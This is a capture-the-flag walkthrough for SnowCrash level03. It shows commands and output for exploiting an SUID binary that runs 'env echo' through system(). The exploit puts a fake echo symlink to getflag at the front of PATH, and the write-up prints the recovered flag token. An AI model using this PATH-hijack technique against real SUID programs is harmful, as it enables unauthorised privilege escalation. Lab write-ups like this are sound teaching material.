# SnowCrash Level03 Walkthrough

This walkthrough explains how we retrieved the flag for `level03` in the SnowCrash wargame.

---

## Step 1: Exploring the Environment

After logging into `level03`, we run `ls` and find the following:

```bash
level03@SnowCrash:~$ ls
level03
```

We check file permissions with `ls -la`:

```bash
level03@SnowCrash:~$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

This file is owned by `flag03` and has the SUID bit set, meaning it runs with the permissions of `flag03`.

---

## Step 2: Running the Binary

We execute the binary:

```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

---

## Step 3: Tracing with `ltrace`

We run `ltrace` to see the function calls:

```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                          = 2003
geteuid()                                          = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
<unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                             = 0
+++ exited (status 0) +++
```

We observe the binary runs:

```bash
system("/usr/bin/env echo Exploit me")
```

---

## Step 4: Exploiting the Binary

We can exploit this by manipulating the `PATH` environment variable. We replace `echo` with a symbolic link to `getflag`:

```bash
ln -s /bin/getflag /tmp/echo
export PATH=/tmp:$PATH
```

Then run the binary again:

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

## ✅ Summary

- The binary uses `system("/usr/bin/env echo ...")`, which depends on the `PATH`
- By placing our own `echo` in the `PATH`, we execute `getflag` instead
- Successfully escalated privileges and retrieved the flag

**Flag:** `qi0maab88jeaj46qoumi7maus`
